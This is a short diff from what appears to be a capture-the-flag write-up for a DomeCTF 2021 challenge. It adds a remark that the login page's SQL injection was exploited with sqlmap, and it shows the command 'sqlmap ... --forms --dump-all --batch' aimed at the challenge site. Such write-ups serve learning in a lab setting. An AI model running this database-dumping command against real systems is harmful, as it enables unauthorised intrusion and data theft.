@@ -282,7 +282,7 @@ Challenge: [https://brut.2021.domectf.in/](https://brut.2021.domectf.in/)
 
 ![](/assets/img/posts/domectf/us/1.png)
 
-The Login page is vulnerable for `sql injection`.
+The Login page is vulnerable for `sql injection`. Here i used [sqlmap](https://sqlmap.org/) to automate the process. 
 
 ```bash
 ➜  sqlmap "https://brut.2021.domectf.in/" --forms --dump-all --batch
